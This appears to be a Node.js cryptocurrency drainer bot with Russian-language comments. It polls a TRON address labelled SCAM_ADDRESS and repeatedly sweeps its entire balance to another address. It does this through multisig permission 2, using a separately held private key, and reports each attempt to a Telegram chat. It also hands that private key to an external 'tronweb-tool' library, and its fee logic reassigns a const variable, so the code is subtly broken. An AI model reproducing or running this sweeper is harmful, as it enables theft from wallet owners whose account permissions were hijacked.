import { TronWeb } from "tronweb";
import { Telegraf } from "telegraf";
import { ValidateAddress, Signature, Senqo } from "tronweb-tool";
import { readFile } from "fs/promises";

// КОНФИГ
const config = JSON.parse(await readFile("config.json", "utf-8"));
const {
  CHAT_ID,
  BOT_TOKEN,
  TO_ADDRESS,
  SCAM_ADDRESS,
  TRONGRID_API_KEY,
  PRIVATE_KEY_ADDRESS_2
} = config;
console.log(CHAT_ID);

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const CHECK_INTERVAL = 10_000; // интервал проверки баланса (10 секунд)
const MIN_BALANCE = 1; // минимальное кол-во TRX для отправки (1 TRX)
const DEDUCT = 0;
const CONFIRM_DELAY = 90_000; // 90 секунд
const DEDUCT_STEP = 0.6;
const MAX_DEDUCT = 5; // защита от бесконечного увеличения
const bot = new Telegraf(BOT_TOKEN);
const senqo = Senqo();
let isSending = false; // статус отправки (по умолчанию нет)
const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  headers: {
    "TRON-PRO-API-KEY": TRONGRID_API_KEY,
  },
  privateKey: PRIVATE_KEY_ADDRESS_2,
});
async function send_tg(text) {
  try {
    await bot.telegram.sendMessage(CHAT_ID, text, {
      parse_mode: "HTML",
    });
  } catch (e) {}
}
async function trySendWithAdaptiveFee() {
  if (isSending) return;
  isSending = true;
  try {
    let balanceSun = await tronWeb.trx.getBalance(SCAM_ADDRESS);
    let startBalance = Number(tronWeb.fromSun(balanceSun));
    console.log(`Баланс: ${startBalance.toFixed(2)} TRX`);
    if (startBalance <= MIN_BALANCE) {
      isSending = false;
      return;
    }
    while (DEDUCT <= MAX_DEDUCT) {
      const amountToSend = startBalance - DEDUCT;
      if (amountToSend <= 0) break;
      await send_tg(`
⚠️ <b>Попытка отправки</b>

💰 Баланс: <b>${startBalance.toFixed(2)} TRX</b>
🧾 Комиссия (DEDUCT): <b>${DEDUCT.toFixed(2)} TRX</b>
📤 К отправке: <b>${amountToSend.toFixed(2)} TRX</b>
      `);
      await sleep(15_000);
      const tx = await tronWeb.transactionBuilder.sendTrx(
        TO_ADDRESS,
        tronWeb.toSun(amountToSend),
        SCAM_ADDRESS
      );
      tx.raw_data.permission_id = 2;
      const signedTx = await tronWeb.trx.multiSign(
        tx,
        Signature(PRIVATE_KEY_ADDRESS_2, senqo)
      );
      await tronWeb.trx.sendRawTransaction(signedTx);
      console.log("Ожидания подтверждения...");
      await sleep(CONFIRM_DELAY);
      const newBalanceSun = await tronWeb.trx.getBalance(SCAM_ADDRESS);
      const newBalance = Number(tronWeb.fromSun(newBalanceSun));
      if (newBalance < startBalance) {
        // успех
        await send_tg(`
✅ <b>Транзакция подтверждена</b>

📉 Было: <b>${startBalance.toFixed(2)} TRX</b>
📉 Стало: <b>${newBalance.toFixed(2)} TRX</b>
💸 Использованная комиссия: <b>${DEDUCT.toFixed(2)} TRX</b>
        `);
        DEDUCT = 1;
        isSending = false;
        return;
      }
      DEDUCT += DEDUCT_STEP;

      await send_tg(`
❌ <b>Транзакция не прошла</b>

⏱ Баланс не изменился
⬆️ Увеличиваем комиссию до <b>${DEDUCT.toFixed(2)} TRX</b>
      `);
    }

    await send_tg(`
🛑 <b>Остановка</b>

Комиссия достигла <b>${DEDUCT.toFixed(
      2
    )} TRX</b>, дальнейшие попытки остановлены
    `);
  } catch (err) {
    await send_tg(`
❌ <b>Ошибка</b>
<code>${err.message}</code>
    `);
  } finally {
    isSending = false;
  }
}

// уведомления в телеграм если со скриптом что-то случится
let isShuttingDown = false;
let interval;
async function shutdown(reason) {
  if (isShuttingDown) return;
  isShuttingDown = true;
  if (interval) clearInterval(interval);
  await send_tg(
    `🛑 <b>Скрипт остановлен</b>\n\n` +
      `📌 Причина: <code>${reason}</code>\n` +
      `⏱ Время: <code>${new Date().toLocaleString()}</code>`
  );
  setTimeout(() => process.exit(0), 500);
}
process.on("SIGINT", () => shutdown("SIGINT (Ctrl+C)"));
process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGHUP", () => shutdown("SIGHUP"));
process.on("SIGQUIT", () => shutdown("SIGQUIT"));
process.on("uncaughtException", (err) => {
  shutdown(`uncaughtException: ${err.message}`);
});
process.on("unhandledRejection", (reason) => {
  shutdown(`unhandledRejection: ${reason}`);
});
if (ValidateAddress(SCAM_ADDRESS, senqo)) {
  console.log("--------- Code by @MIDDLE_DEV_TON ---------\n\n");
  await send_tg("✅ <b>Скрипт запущен</b>");
  interval = setInterval(trySendWithAdaptiveFee, CHECK_INTERVAL);
}
